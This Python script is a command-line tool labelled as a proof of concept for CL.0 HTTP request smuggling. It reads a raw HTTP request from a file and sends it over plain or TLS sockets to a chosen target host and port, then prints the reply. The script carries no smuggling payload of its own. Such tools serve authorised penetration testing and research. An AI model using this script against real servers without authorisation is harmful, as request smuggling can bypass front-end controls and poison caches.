import socket
import ssl
import argparse
import sys

def load_request_file(filepath):
    try:
        with open(filepath, 'r') as f:
            data = f.read()
        # Convert LF to CRLF
        data = data.replace('\n', '\r\n')
        if not data.endswith('\r\n\r\n'):
            data += '\r\n\r\n'
        return data
    except Exception as e:
        print(f"[!] Error reading request file: {e}")
        sys.exit(1)

def send_payload(host, port, payload, use_https=False):
    try:
        # Create socket connection
        sock = socket.create_connection((host, port), timeout=5)
        if use_https:
            # Wrap the socket with SSL context for HTTPS
            context = ssl.create_default_context()
            sock = context.wrap_socket(sock, server_hostname=host)

        print(f"[*] Sending payload to {host}:{port} {'(HTTPS)' if use_https else '(HTTP)'}")
        sock.sendall(payload.encode())
        sock.settimeout(3)

        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break

        sock.close()
        print("[*] Response received:\n")
        print(response.decode(errors="replace"))
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

def main():
    # Create argument parser
    parser = argparse.ArgumentParser(description="CL.0 HTTP Request Smuggling PoC")
    parser.add_argument("-H", "--host", required=True, help="Target host")
    parser.add_argument("-P", "--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("-f", "--file", required=True, help="Request file (raw HTTP)")
    parser.add_argument("--https", action="store_true", help="Use HTTPS (TLS)")

    # Parse arguments
    args = parser.parse_args()

    # Ensure that port 443 is correctly set with --https
    if args.https and args.port != 443:
        print("[!] Warning: HTTPS is selected but port is not 443. Proceeding anyway...")
    
    # Load the raw HTTP request from the file
    raw_request = load_request_file(args.file)

    # Send the payload with/without HTTPS
    send_payload(args.host, args.port, raw_request, args.https)

if __name__ == "__main__":
    main()
